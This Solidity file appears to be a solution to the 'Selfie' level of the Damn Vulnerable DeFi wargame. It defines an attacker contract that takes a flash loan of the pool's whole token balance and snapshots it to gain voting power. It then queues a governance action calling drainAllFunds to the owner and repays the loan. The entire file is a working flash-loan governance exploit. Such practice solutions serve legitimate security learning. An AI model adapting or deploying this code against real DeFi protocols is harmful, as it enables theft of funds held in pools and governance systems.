// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfieAttackerContract
 */
contract SelfieAttackerContract {
    using Address for address;

    address private owner;
    SelfiePool private pool;
    DamnValuableTokenSnapshot private token;
    SimpleGovernance private governance;
    uint256 public actionId;

    constructor(
        address poolAddress,
        address tokenAddress,
        address governanceAddress
    ) {
        owner = msg.sender;
        pool = SelfiePool(poolAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        // snapshot received loan
        token.snapshot();

        // Add drainAllFunds function call in actions queue and save Id
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        // pay back flash loan
        token.transfer(address(pool), _amount);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    receive() external payable {}
}
